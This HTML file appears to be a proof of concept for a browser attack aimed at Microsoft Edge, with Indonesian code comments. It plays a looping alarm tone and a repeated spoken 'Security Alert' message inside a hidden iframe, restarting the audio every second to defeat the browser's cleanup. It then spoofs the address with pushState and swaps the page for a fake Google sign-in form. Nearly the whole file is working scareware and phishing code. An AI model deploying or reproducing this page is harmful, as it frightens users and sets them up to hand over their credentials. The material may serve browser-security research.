<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Edge Keep-Alive Audio</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 50px; }
    #status { margin-top: 20px; color: #0078d4; font-weight: bold; }
  </style>
</head>
<body>
  <h2>Memverifikasi Sesi...</h2>
  <div id="status">Menunggu otorisasi...</div>

  <script>
    const statusEl = document.getElementById('status');

    // 1. Buat Iframe Tersembunyi
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.sandbox = "allow-scripts allow-same-origin allow-autoplay"; 
    document.body.appendChild(iframe);

    // 2. Tulis kode Audio ke dalam Iframe
    const iframeDoc = iframe.contentWindow.document;
    iframeDoc.open();
    iframeDoc.write(`
      <script>
        let audioCtx = null;
        let activeOsc = null;

        function startAudio() {
          try {
            if (!audioCtx) {
              audioCtx = new (window.AudioContext || window.webkitAudioContext)();
              if (audioCtx.state === 'suspended') audioCtx.resume();
            }
            
            // Hentikan oscillator lama jika ada
            if (activeOsc) {
              try { activeOsc.stop(); } catch(e) {}
              activeOsc = null;
            }

            // Buat oscillator baru
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            osc.type = 'sawtooth';
            osc.frequency.value = 440;
            gain.gain.value = 0.05;
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.start();
            
            activeOsc = osc;
            console.log("[Iframe] Oscillator restarted.");
          } catch (e) {
            console.log("[Iframe] Audio error:", e.message);
          }
        }

        // Mulai audio pertama kali
        startAudio();

        // Dengarkan perintah dari Parent untuk restart audio
        window.addEventListener('message', (e) => {
          if (e.data === 'RESTART_AUDIO') {
            startAudio();
          }
        });

        // TTS Looping
        if ('speechSynthesis' in window) {
          const text = "Security Alert. Your account has been accessed. ".repeat(5);
          function speakLoop() {
            const utter = new SpeechSynthesisUtterance(text);
            utter.lang = 'en-US';
            utter.rate = 0.8;
            utter.onend = speakLoop;
            window.speechSynthesis.speak(utter);
          }
          speakLoop();
        }
      <\/script>
    `);
    iframeDoc.close();

    // 3. Parent: Kirim perintah "RESTART_AUDIO" setiap 1 detik
    // Ini akan mencegah Edge membersihkan audio
    setInterval(() => {
      try {
        iframe.contentWindow.postMessage('RESTART_AUDIO', '*');
      } catch(e) {}
    }, 1000);

    // 4. UI Spoofing via pushState (setelah 1.5 detik)
    setTimeout(() => {
      try {
        window.history.pushState({}, '', '/fake-google-login');
        document.body.innerHTML = `
          <div style="text-align: center; margin-top: 100px;">
            <h1 style="color: #4285f4; font-size: 40px;">Google</h1>
            <p>Sign in to continue</p>
            <input type="text" placeholder="Email" style="padding: 10px; margin: 5px; width: 250px;"><br>
            <input type="password" placeholder="Password" style="padding: 10px; margin: 5px; width: 250px;"><br>
            <button style="padding: 10px 20px; margin-top: 10px; background: #4285f4; color: white; border: none;">Next</button>
          </div>
        `;
        console.log("UI Spoofed. Audio should still be looping in iframe.");
      } catch (e) {
        console.log("pushState failed:", e.message);
      }
    }, 1500);

  </script>
</body>
</html>
